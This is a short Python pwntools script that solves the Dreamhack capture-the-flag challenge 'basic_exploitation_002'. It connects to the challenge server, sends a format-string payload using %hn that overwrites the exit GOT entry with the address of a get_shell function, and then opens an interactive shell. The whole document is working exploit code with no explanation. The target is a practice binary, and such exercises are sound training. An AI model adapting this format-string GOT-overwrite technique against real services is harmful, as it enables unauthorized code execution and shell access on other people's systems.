from pwn import *

r = remote("host8.dreamhack.games", 12900)
e = ELF("/mnt/c/Users/Storm/ctf/basic_exploitation_002")
libc = e.libc

exit_got = e.got['exit']
get_shell = e.symbols['get_shell']
get_shell = p32(get_shell)
original = p32(0x8048476)

under = get_shell[:2]
under = int.from_bytes(under, "little")

payload = f"%{under}c".encode()
payload += b"%5$hn"
to_add = 16 - len(payload)
payload += b"A" * to_add
payload += p32(exit_got)

r.send(payload)

r.interactive()